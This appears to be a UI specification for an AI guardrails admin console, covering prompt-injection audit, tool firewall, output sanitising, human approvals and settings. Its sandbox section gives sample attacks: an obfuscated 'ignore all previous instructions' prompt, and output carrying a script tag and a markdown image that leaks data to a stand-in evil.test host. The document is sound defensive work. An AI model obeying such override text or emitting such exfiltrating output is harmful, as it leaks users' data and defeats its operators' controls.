SectionLabel: "CONTROL {letter}" × 4         ← controls grid
  .controls-grid (4 × ControlCard)

SectionLabel: "Injection throughput · 7 days"   ← throughput
  right: legend (Allowed/Observed/Blocked colour swatches)
Panel pad:
  Charts.StackedAreaChart (points=MOCK.trend)

SectionLabel: "Totals · last 24h"               ← totals
.grid.cols-4.gap-14:
  StatCard "Prompts screened" icon="scan" value=attempts_24h sub="across all agents"
  StatCard "Observed"         icon="eye"  value=observed_24h  sub="monitor-mode would-block"
  StatCard "Blocked"          icon="shield" value=blocked_24h delta="injection attempts refused" deltaDir="up"
  StatCard "Pending approvals" icon="gavel" value=pending_approvals delta="awaiting human review" deltaDir="flat"
```

#### Control cards (each `<button class="panel control-card s-{status}">`)

| id | letter | icon | name | spark color |
|---|---|---|---|---|
| tool_firewall | A | shield | Tool Firewall | `var(--color-accent)` |
| input_screen | B | scan | Input Screening | `var(--color-block)` (has blocked events) |
| output_handler | C | filter | Output Handler | `var(--color-observe)` (monitor mode) |
| hitl | D | gavel | HITL Bridge | `var(--color-warn)` (degraded) |

Card is clickable → navigate to `c.route`.

#### Interactive elements

- Time range `<select>` in page actions: "Last 24h" / "Last 7 days" / "Last 30 days". Currently cosmetic in prototype — in product, triggers API re-query with `from/to` params.
- LivePill in actions bar.
- Each control card navigates to its detail screen on click.

---

### 4.2 Injection Audit (`/audit`)

**Source:** `docs/prototype/app/pages-core.jsx` → function `InjectionAudit` (lines 145–319).
**Data shape:** `MOCK.audit[]`, `MOCK.ruleLabels`.

#### Layout

```
PageHead (icon="list", title="Injection Audit Log")
  actions: <LivePill>

Panel:
  .filter-bar:
    SearchInput placeholder="Search prompt text…"
    <select> verdict: all / blocked / observed / allowed / too_long
    <select> rule: any / {ruleLabels keys}
    <input.mono> principal (width 110px, placeholder "principal")
    .grow (spacer)
    result count "{n} results"

  DataTable columns:
    verdict      (116px)  → VerdictBadge(kind=r.verdict)
    rule_id      (170px)  → <span.cell-mono> or subtle "—"
    principal_id (84px)   → <span.cell-mono>
    prompt               → .cell-prompt truncated, OR privacy icon ("stored hashed" / "truncated · N chars" / "redacted")
    when         (90px)   → .cell-when ago
    arrow        (28px)   → ChevronRight icon

  [if filtered.length > shown.length]:
    "Load more · N remaining" button (border-top, centered)

[Drawer when row selected]:
  title: "Attempt #{id}"
  sub:   "{occurred_at} UTC"
  badge: VerdictBadge
  body:
    KV: [Verdict, Mode, Rule, Ruleset, Principal, Storage, Recorded]
    SectionLabel "Prompt [· matched span highlighted]"
    if raw: PromptExcerpt(text, match)
    else:   PromptPrivacy(storage, hash, length)
    Banner:
      blocked  → warn icon="lock" "The model was **never called**..."
      observed → info icon="eye"  "**Monitor mode** — would have been blocked..."
      too_long → warn icon="alert" "Prompt exceeded screening length cap..."
      allowed  → info icon="check" "Allowed through to the model..."
```

#### Interactive elements

- Search filter (client-side in prototype, server-side in product via `q` param).
- Verdict select: re-filters.
- Rule select: re-filters.
- Principal input: exact-match filter.
- Row click → drawer opens.
- Drawer ESC / scrim click → closes.
- Load more → appends 7 more rows (server: next_cursor).

---

### 4.3 Tool Firewall (`/firewall`)

**Source:** `docs/prototype/app/pages-core.jsx` → function `ToolFirewall` (lines 325–477).
**Data shape:** `MOCK.firewall`.

#### Layout

```
PageHead (icon="shield", title="Tool Firewall")
  actions: badge "ENGAGED" (badge-allow) or "DISABLED" (badge-neutral) per enabled state

[if !enabled]: Banner warn "This control is disabled..."

SectionLabel "Posture"
Panel pad:
  flex col gap-20:
    toggle row: "Firewall enabled" + hint / Toggle(enabled)
    divider
    toggle-label "Owner keys" + hint
    Chips(values=keys, onRemove, onAdd, addLabel="Add owner key")
    divider
    toggle row: "Reject unknown arguments" + hint / Toggle(rejectUnknown)

SectionLabel "Tool authorization"
Panel pad:
  flex row: toggle-label "Authorization layer" + ON/OFF badge + hint "Read-only here..."
  KV (right side): [owner_key_depth, destructive_match]

SectionLabel "Rejections · last 24h: {count}"
Panel:
  [if 0]: EmptyState positive "No tool-argument rejections — good."
  [else]:
    DataTable columns:
      tool         (140px) → cell-mono
      reason_kind  (124px) → badge-pending (authorization) or badge-warn (schema)
      violations           → cell-muted first entry's value
      principal_id (84px)  → cell-mono
      when         (86px)  → cell-when
      arrow        (28px)  → chevronRight

[Sticky SaveBar when dirty]:
  "You have unsaved firewall changes." / Discard / Save

[Drawer when rejection selected]:
  title: "Rejection · {tool}"
  sub: "{occurred_at} UTC · principal {principal_id}"
  badge: reason_kind badge
  body:
    SectionLabel "Violations"
    CodeBlock: each violation key (colored block) + value text
    Banner info icon="shield" "The firewall handled this server-side..."
```

#### Interactive elements

- Firewall enabled toggle → marks dirty.
- Owner keys: remove chip (×), add key (prompt() for new value) → dirty.
- Reject unknown toggle → dirty.
- SaveBar Discard: reverts all state. Save: calls `PUT /settings` (firewall keys), shows toast.
- Rejection row click → drawer.

---

### 4.4 Output Handler (`/output`)

**Source:** `docs/prototype/app/pages-core.jsx` → function `OutputHandler` (lines 482–590).
**Data shape:** `MOCK.output`.

#### Layout

```
PageHead (icon="filter", title="Output Handler")
  actions: badge "MONITOR" (badge-observe) or "ENFORCE" (badge-allow) per mode

[if monitor mode]: Banner info icon="eye" "Shadow mode. Handler computes what it would sanitize..."

.grid.cols-4.gap-14:
  StatCard "HTML escaped"            icon="code"   value=html_escaped_count         sub="tags neutralized"
  StatCard "Markdown neutralized"    icon="filter" value=markdown_neutralized_count  sub="link/image vectors"
  StatCard "Structured rejections"   icon="alert"  value=structured_rejections       sub="schema violations"
  StatCard "PII redactions"          icon="eye"    value=pii.total_redactions        sub="across all detectors"

SectionLabel "PII redactions by detector"
  right: StatusDot(engaged/degraded) + "pii-redactor available/absent"
Panel pad:
  Charts.BarBreakdown(items=[{label:detector, value:count, color:var(--color-accent)}])

SectionLabel "Handler configuration"
Panel pad:
  flex col gap-16:
    row: toggle-label "Sanitize HTML" + hint / segmented(escape|allowlist) + Toggle(sanitizeHtml)
    row: toggle-label "Neutralize markdown" + hint / Toggle(neutralizeMd)
    row: toggle-label "Redact PII" + hint / Toggle(redactPii, disabled if !pii_available)
    [if !pii_available]: Banner warn "PII redaction unavailable — ..."

[Sticky SaveBar when dirty]:
  "You have unsaved output-handler changes." / Discard / Save
```

#### Interactive elements

- Sanitize HTML toggle + HTML mode segmented (escape/allowlist) → dirty.
- Neutralize markdown toggle → dirty.
- Redact PII toggle (disabled if `pii_available === false`) → dirty.
- SaveBar Discard: reverts. Save: `PUT /settings` (output_handler.*), toast.

---

### 4.5 Approvals (`/approvals`)

**Source:** `docs/prototype/app/pages-ops.jsx` → function `Approvals` (lines 34–171).
**Data shape:** `MOCK.approvals` (`{hitl_enabled, flow_available, fallback, items[]}`).

#### Layout

```
PageHead (icon="gavel", title="Approvals · HITL Bridge")
  actions: <LivePill>

Banner: info (flow available) or warn (flow absent)
  flow available: "Bridge active in fallback={fallback} posture..."
  flow absent:    "HITL bridge inactive — laravel-flow not installed..."

Panel:
  [if items empty]: EmptyState positive "No actions awaiting approval"
  [else]:
    DataTable columns:
      tool      (130px)  → cell-mono
      arguments          → cell-prompt JSON preview (max 48 chars truncated)
      requested (100px)  → cell-when requested_ago
      expires   (90px)   → cell-when expires_in
      action    (110px)  → inline approve/reject buttons (stop propagation)
        btn-sm btn-allow (check icon) / btn-sm btn-block (x icon)

[Drawer when row selected — detail view]:
  title: "Approve · {tool}"
  sub:   "requested {requested_ago} · expires in {expires_in}"
  badge: VerdictBadge pending
  footer: btn-allow "Approve" + btn-block "Reject" (open confirm drawer)
  body:
    KV: [Tool, Token, Run id, Requested, Expires]
    SectionLabel "Scoped arguments"
    CodeBlock: JSON.stringify(arguments, null, 2)
    Banner warn icon="alert" "This is a **destructive** action..."

[Confirm drawer (approve or reject)]:
  title: "Confirm approval" or "Confirm rejection"
  sub: tool name
  footer: btn-ghost "Cancel" + (btn-allow "Yes, approve & run" OR btn-block "Yes, reject")
  body: explanatory paragraph + mono token display
```

#### Interactive elements

- Inline approve/reject buttons (click does not open row drawer — `stopPropagation`).
- Row click → detail drawer.
- Detail drawer footer → opens confirm drawer.
- Confirm drawer: Cancel → close confirm. Confirm → call `POST /approvals/{token}/approve` or `reject`, remove row, show toast.
- After action: item removed from list, drawer closed.

---

### 4.6 Settings (`/settings`)

**Source:** `docs/prototype/app/pages-ops.jsx` → function `Settings` (lines 177–416).
**Data shape:** `MOCK.settings`.

#### Layout (top to bottom)

```
PageHead (icon="settings", title="Settings")
  actions: btn "Change history" → navigate /settings/audit

SectionLabel "Master"
Panel pad:
  toggle row: "Guardrails enabled" + kill-switch hint / Toggle(st.enabled)

SectionLabel "Control A · Tool Firewall"
  right: ModeSegmented(st.modes.tool_firewall)
Panel pad:
  Field "Owner keys" + hint → Chips(st.tool_firewall.owner_keys, editable)
  SettingToggle "Reject unknown arguments" + hint / Toggle

SectionLabel "Control B · Input Screening"
  right: ModeSegmented(st.modes.input_screen)
Panel pad:
  Field "Refusal message" → <input.input full-width>
  Field "Patterns" + hint:
    for each [rid, rx]: chip(mono, minWidth:150) + input(mono, grow, red border if !valid) + [alert badge if invalid]

SectionLabel "Control C · Output Handler"
  right: ModeSegmented(st.modes.output_handler)
Panel pad:
  flex wrap gap-20:
    SettingToggle compact "Sanitize HTML"
    SettingToggle compact "Neutralize markdown"
    SettingToggle compact "Redact PII"
  Field "HTML mode" → <select> escape | allowlist

SectionLabel "Control D · HITL Bridge"
  right: ModeSegmented(st.modes.hitl)
Panel pad:
  Field "Destructive tools" + hint → Chips(st.hitl.destructive_tools, editable)
  Field "Fallback" + hint → <select> deny (safe) | pass

SectionLabel "Normalization · pre-screening"
Panel pad:
  flex wrap gap-20:
    SettingToggle compact "NFKC fold"
    SettingToggle compact "Strip zero-width"
    SettingToggle compact "Casefold"
    SettingToggle compact "Decode base64"
  Field "Max prompt length" → <input.input.mono.tnum type=number width:140>

SectionLabel "Pattern safety"
Panel pad:
  flex wrap items-end:
    Field "On match error" → <select> block (fail closed) | allow (fail open)
    Field "Ruleset version" + hint "read-only" → chip.mono (non-editable)

SectionLabel "Tool authorization"
Panel pad:
  SettingToggle "Authorization layer enabled" + hint
  flex wrap items-end:
    Field "Owner-key depth" → <select> top_level | recursive
    Field "Destructive match" → <select> exact | substring

SectionLabel "Audit hygiene & retention"
Panel pad:
  flex wrap items-end:
    Field "Prompt storage" → <select> raw | redact | hash | truncate
    Field "Retention (days)" → <input.mono.tnum type=number width:120>
    Field "Strategy" → <select> purge | anonymize
  SettingToggle "Emit events" + hint

SectionLabel "Injection Audit Store"
Panel pad:
  flex wrap items-end:
    Field "Store driver" → <select> null | array | database
    Field "Table" → <input.mono width:280>

[Sticky SaveBar when dirty]
```

#### Sub-components (internal to Settings)

- `Field({ label, hint, children })` — label + optional hint above children; `margin-bottom: 9px`.
- `SettingToggle({ name, hint, on, onChange, compact })`:
  - compact: `flex items-center gap-12` → Toggle + name text.
  - full: `flex items-center justify-between gap-16` → label/hint left, Toggle right.

#### Interactive elements

- Every editable field marks `dirty` on change.
- Regex pattern inputs validate client-side; invalid → red border + alert badge + Save disabled for that field.
- Non-overridable keys (keys NOT in `st.overridable[]`) → disabled inputs with "set via config" tooltip.
- "Change history" button → navigates to `/settings/audit`.
- SaveBar: Discard resets to server state. Save calls `PUT /settings` with only changed overridable keys; toast on success.

---

### 4.7 Settings Change History (`/settings/audit`)

**Source:** `docs/prototype/app/pages-ops.jsx` → function `SettingsAudit` (lines 679–730).
**Data shape:** `MOCK.settingsAudit[]`.

#### Layout

```
PageHead (icon="history", title="Settings Change History")
  actions: btn "Back to Settings" (icon="settings") → navigate /settings

Panel:
  DataTable columns:
    actor  (220px) → Icon(bolt if system/user) + actor text (font-size: 12.5px)
    key    (220px) → cell-mono
    diff           → chip.mono (old_value, red tinted) + ChevronRight + chip.mono (new_value, green tinted)
    when   (90px)  → cell-when

  [Load more button if rows > shown]

[Empty state: "No configuration changes recorded"]
```

Diff chip styles:
- Old value chip: `background: color-mix(in srgb, var(--color-block) 12%, transparent); borderColor: transparent; color: var(--color-block)`.
- New value chip: `background: color-mix(in srgb, var(--color-allow) 14%, transparent); borderColor: transparent; color: var(--color-allow)`.

Actor icon: `bolt` if `actor.startsWith("system")`; else `user`.

Rows are **not clickable** (no `onRowClick`).

---

### 4.8 Try · Sandbox (`/try`)

**Source:** `docs/prototype/app/pages-ops.jsx` → function `TrySandbox` (lines 566–673).
**Data shape:** uses `MOCK.settings.normalization` + `MOCK.settings.input_screen.patterns` for
client-side normalization. In the product, delegates to `POST /try/screen` + `POST /try/sanitize`.

#### Layout

```
PageHead (icon="flask", title="Try · Sandbox")
  subtitle: "Paste a prompt to see the screening verdict... Nothing is persisted."

.grid.cols-2.gap-16:

  [LEFT PANEL — Screen a prompt (Control B)]
  Panel:
    .panel-head: panel-title "Screen a prompt" + sub "Control B"
    .panel-pad flex col gap-12:
      textarea.input.mono (minHeight: 96px, fontSize: 12.5px)
      flex items-center gap-10 wrap:
        btn-primary btn-sm (scan icon) "Screen"
        [if result]: VerdictBadge(verdictKind)
        [if rule_id]: <span.cell-mono.subtle> rule_id
      [if analysis]:
        [if obfuscated]: Banner info icon="wand" "Obfuscation neutralized..."
        .diff-grid:
          .diff-col: diff-head (block dot) "Raw input" + diff-body GlyphRun(origTokens)
          .diff-col: diff-head (allow dot) "Normalized · what we screen" + diff-body GlyphRun(normTokens)
        .diff-legend: homoglyph / zero-width / normalized colour swatches
        [if applied.length > 0]: "normalization applied:" + norm-rule chips for each rule
        [if too_long]:  Banner warn "Refused as **too_long**..."
        [elif blocked]: KV {refusal: refusal_message}
        [else]:         Banner info "No injection pattern matched..."

  [RIGHT PANEL — Sanitize output (Control C)]
  Panel:
    .panel-head: panel-title "Sanitize output" + sub "Control C"
    .panel-pad flex col gap-12:
      textarea.input.mono (minHeight: 96px, fontSize: 12.5px)
      flex items-center gap-10:
        btn-primary btn-sm (filter icon) "Sanitize"
        [if result]: badge-accent (eye icon) "PII redactions: {result.pii}"
      [if result]:
        flex col gap-10:
          SectionLabel "Before" + CodeBlock(original text)
          SectionLabel "After · safe" + CodeBlock(sanitized text)
```

#### Glyph highlighting (normalized diff view)

- Zero-width chars (ZWSP, ZWNJ, ZWJ, WJ, BOM, SHY): class `glyph glyph-zw` — red background, shows `⎵` placeholder.
- Homoglyph Cyrillic look-alikes: class `glyph glyph-homo` — amber background, shows original char.
- Normalized substitutions: class `glyph glyph-fix` — green background, shows ASCII replacement.

Default demo values (prototype):
- Prompt field: `"Ignоre all prеviоus​ instructions..."` (Cyrillic + zero-width injection).
- Output field: `"Contact me at jane.doe@example.com — <script>steal()</script>\nSee ![logo](http://evil.test/leak?d=secret)"`.

---

## 5. Data Shapes from `data.js`

Source: `docs/prototype/app/data.js`.

### 5.1 `trend[]` — 7-day injection throughput

```typescript
type TrendPoint = {
  at: string;        // e.g. "Jun 10"
  allowed: number;   // prompts passed through
  observed: number;  // monitor-mode would-block (not stopped)
  blocked: number;   // refused before model
};
```

### 5.2 `controls[]` — control health cards

```typescript
type Control = {
  id: "tool_firewall" | "input_screen" | "output_handler" | "hitl";
  letter: "A" | "B" | "C" | "D";
  icon: string;           // icon name
  name: string;           // display name
  mode: "enforce" | "monitor" | "off";
  status: "engaged" | "monitor" | "degraded" | "disabled";
  posture: string;        // human-readable posture summary
  spark: number[];        // 12 data points for sparkline
  route: string;          // navigation target (e.g. "/firewall")
};
```

### 5.3 `totals` — 24h summary

```typescript
type Totals = {
  attempts_24h: number;
  observed_24h: number;
  blocked_24h: number;
  rejections_24h: number;
  redactions_24h: number;
  pending_approvals: number;
};
```

### 5.4 `audit[]` — injection audit log entries

```typescript
type AuditEntry = {
  id: number;
  verdict: "allowed" | "blocked" | "observed" | "too_long";
  rule_id: string | null;
  mode: "enforce" | "monitor";
  ruleset_version: string;          // e.g. "r2026.06.2"
  prompt_storage: "raw" | "hash" | "redact" | "truncate";
  principal_id: string;
  prompt: string | null;            // null when not raw
  prompt_hash?: string;             // present when storage="hash" (format: "sha256:{hex}")
  prompt_length?: number;           // present when storage="truncate"
  matched: [number, number] | null; // [startIdx, endIdx] of matched rule span
  occurred_at: string;              // "YYYY-MM-DD HH:mm:ss"
  ago: string;                      // relative time e.g. "2m ago"
};
```

### 5.5 `ruleLabels` — rule id → display name

```typescript
type RuleLabels = Record<string, string>;
// Example: { ignore_previous: "ignore_previous", reveal_system_prompt: "...", ... }
```

### 5.6 `firewall` — tool firewall config + rejections

```typescript
type Firewall = {
  enabled: boolean;
  mode: "enforce" | "monitor" | "off";
  owner_keys: string[];
  reject_unknown_arguments: boolean;
  tool_authorization: {
    enabled: boolean;
    owner_key_depth: "top_level" | "recursive";
    destructive_match: "exact" | "substring";
  };
  rejections: FirewallRejection[];
};

type FirewallRejection = {
  id: number;
  tool: string;
  reason_kind: "authorization" | "schema";
  violations: Record<string, string>;  // field → message
  principal_id: string;
  occurred_at: string;
  ago: string;
};
```

### 5.7 `output` — output handler stats + config

```typescript
type OutputStats = {
  enabled: boolean;
  mode: "enforce" | "monitor" | "off";
  sanitize_html: boolean;
  html_mode: "escape" | "allowlist";
  neutralize_markdown: boolean;
  redact_pii: boolean;
  pii_available: boolean;
  html_escaped_count: number;
  markdown_neutralized_count: number;
  structured_rejections: number;
  pii: {
    total_redactions: number;
    by_detector: Record<string, number>;  // e.g. { email: 320, phone: 140, iban: 52 }
  };
};
```

### 5.8 `approvals` — HITL approval queue

```typescript
type ApprovalsData = {
  hitl_enabled: boolean;
  flow_available: boolean;
  fallback: "deny" | "pass";
  items: ApprovalItem[];
};

type ApprovalItem = {
  token: string;           // e.g. "agt_8f31c0d4e7a94b21"
  run_id: string;          // e.g. "run_01J9K2M4P7"
  tool: string;            // e.g. "issue_refund"
  arguments: Record<string, unknown>;  // scoped args
  status: "pending";
  requested_at: string;
  requested_ago: string;
  expires_at: string;
  expires_in: string;      // e.g. "56m"
};
```

### 5.9 `settings` — full runtime configuration

```typescript
type Settings = {
  enabled: boolean;
  overridable: string[];   // keys the admin may change at runtime
  modes: {
    tool_firewall: Mode;
    input_screen: Mode;
    output_handler: Mode;
    hitl: Mode;
  };
  tool_firewall: {
    owner_keys: string[];
    reject_unknown_arguments: boolean;
  };
  input_screen: {
    refusal_message: string;
    patterns: Record<string, string>;  // rule_id → PCRE string (e.g. "/\\bignore.../i")
  };
  output_handler: {
    sanitize_html: boolean;
    html_mode: "escape" | "allowlist";
    neutralize_markdown: boolean;
    redact_pii: boolean;
  };
  hitl: {
    destructive_tools: string[];
    fallback: "deny" | "pass";
  };
  normalization: {
    nfkc: boolean;
    strip_zero_width: boolean;
    casefold: boolean;
    decode_base64: boolean;
    max_prompt_length: number;
  };
  pattern_safety: {
    on_match_error: "block" | "allow";
    ruleset_version: string;   // read-only
  };
  audit_hygiene: {
    prompt_storage: "raw" | "redact" | "hash" | "truncate";
  };
  retention: {
    days: number;
    strategy: "purge" | "anonymize";
  };
  tool_authorization: {
    enabled: boolean;
    owner_key_depth: "top_level" | "recursive";
    destructive_match: "exact" | "substring";
  };
  events: {
    enabled: boolean;
  };
  audit: {
    store: "null" | "array" | "database";
    table: string;
  };
};
type Mode = "enforce" | "monitor" | "off";
```

### 5.10 `settingsAudit[]` — settings change history

```typescript
type SettingsChange = {
  id: number;
  actor: string;           // email or "system (deploy)"
  key: string;             // dotted key e.g. "modes.output_handler"
  old_value: string;
  new_value: string;
  changed_at: string;
  ago: string;
};
```

---

## 6. API Mismatches — Data Not Obviously Provided by the Core API

The following fields exist in `data.js` but the core guardrails HTTP API (`/api/v1/` endpoints per
`docs/prototype/uploads/`) may not yet expose them or maps differently:

| Mock field | Screen | Issue |
|---|---|---|
| `controls[].spark` (12-point number[]) | Dashboard | The core API likely does not expose a per-control 12-point spark series. Implementers must either derive it from the audit trend, compute rolling windows, or add an endpoint. |
| `controls[].posture` (human-readable string) | Dashboard | Not a core API field; must be computed client-side from `mode` + `status` + counts, or added as a computed field in the core's `/overview` response. |
| `controls[].status` ("engaged"\|"monitor"\|"degraded"\|"disabled") | Dashboard | Core exposes `mode` (enforce/monitor/off); `status` is derived (degraded when flow unreachable for hitl). Compute client-side from mode + availability flags. |
| `totals.redactions_24h` | Dashboard | Core's `GET /output/stats` provides cumulative redaction counts, not 24h windows. Need rolling window or a separate `/overview?period=24h` aggregation. |
| `trend[].observed` | Dashboard | The core audit log has `verdict = "observed"` rows but the `/audit/trend` endpoint may only return `{allowed, blocked}`. The prototype uses three bands. Confirm if core exposes `observed` count separately. |
| `audit[].ago` (relative time) | Audit | Pure client-side format from `occurred_at`; not an API field. Compute with dayjs/date-fns. |
| `approvals.hitl_enabled` + `flow_available` | Approvals | The `GET /approvals` response from the core API does include `flow_available` per the API spec. Confirm field name matches exactly. |
| `firewall.rejections[].violations` (Record<string,string>) | Firewall | Core stores this as a JSON blob. Confirm the shape is exactly a flat key-value object (not nested). |
| `output.pii.by_detector` (Record<string,number>) | Output | Core's `GET /output/stats` provides `counts.pii.by_detector` per spec; field name prefix may differ. |
| `settings.overridable[]` (allowlist array) | Settings | This is a meta-field the admin uses to disable non-overridable inputs. Confirm the core API exposes it on `GET /settings`. If not, it must be a static constant in the admin (matching `config/ai-guardrails.php` overridable keys). |
| `settings.audit.store` + `settings.audit.table` | Settings | Read-only in the UI but editable in the mock. The real core has these set via Laravel config, not runtime. Render as disabled/read-only with tooltip "set via config". |
| `ApprovalItem.expires_in` (human string "56m") | Approvals | Core returns `expires_at` timestamp; compute `expires_in` client-side from the delta. |

---

## 7. Prototype File → Screen Map

| Prototype file | Function/Component | Screen |
|---|---|---|
| `app/pages-core.jsx` | `Dashboard` (line 49) | `/` — Dashboard |
| `app/pages-core.jsx` | `InjectionAudit` (line 145) | `/audit` — Injection Audit |
| `app/pages-core.jsx` | `ToolFirewall` (line 325) | `/firewall` — Tool Firewall |
| `app/pages-core.jsx` | `OutputHandler` (line 482) | `/output` — Output Handler |
| `app/pages-ops.jsx` | `Approvals` (line 34) | `/approvals` — Approvals |
| `app/pages-ops.jsx` | `Settings` (line 177) | `/settings` — Settings |
| `app/pages-ops.jsx` | `SettingsAudit` (line 679) | `/settings/audit` — Change History |
| `app/pages-ops.jsx` | `TrySandbox` (line 566) | `/try` — Try · Sandbox |
| `shell.jsx` | `Sidebar`, `Topbar`, `CommandPalette` | App Shell |
| `app/ui.jsx` | All primitives | Shared components |
| `app/charts.jsx` | `Sparkline`, `StackedAreaChart`, `BarBreakdown` | Chart components |
| `app/icons.jsx` | `Icon` | Icon system |
| `app/styles.css` | `:root`/`[data-theme]` tokens + all layout CSS | Design system |
| `app/data.js` | `window.MOCK` | Mock data / API contract |
